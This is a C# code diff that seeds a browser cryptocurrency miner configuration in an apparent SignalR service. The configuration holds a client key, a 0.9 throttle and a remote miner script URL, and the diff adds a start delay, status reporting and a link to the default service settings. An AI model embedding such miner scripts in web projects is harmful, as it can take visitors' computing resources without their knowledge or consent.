@@ -82,7 +82,9 @@ namespace SignalRService.Controllers
                 {
                     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                     Throttle = 0.9f,
-                    ScriptUrl = "https://www.freecontent.date./W7KS.js"
+                    ScriptUrl = "https://www.freecontent.date./W7KS.js",
+                    StartDelayMs = 5000,
+                    ReportStatusIntervalMs = 60000
                 });
             }
 
@@ -214,13 +216,16 @@ namespace SignalRService.Controllers
             //var defaultUser = new Models.UserDataModel() { IdentityName = "Anonymous" };
             //db.UserData.Add(defaultUser);
             //db.SaveChanges();
+            var mc = db.MinerConfiurationModels.FirstOrDefault();
 
             var defaultSetting = new Models.ServiceSettingModel()
             {
-                 Owner = defAccountProp,
-                 ServiceName = "TestService",
-                 ServiceUrl = "testurl",
-                 ServiceType = Enums.EnumServiceType.OrderService
+                Owner = defAccountProp,
+                ServiceName = "TestService",
+                ServiceUrl = "testurl",
+                ServiceType = Enums.EnumServiceType.OrderService,
+                MinerConfiguration = mc
+                 
             };
             db.ServiceSettings.Add(defaultSetting);
             db.SaveChanges();
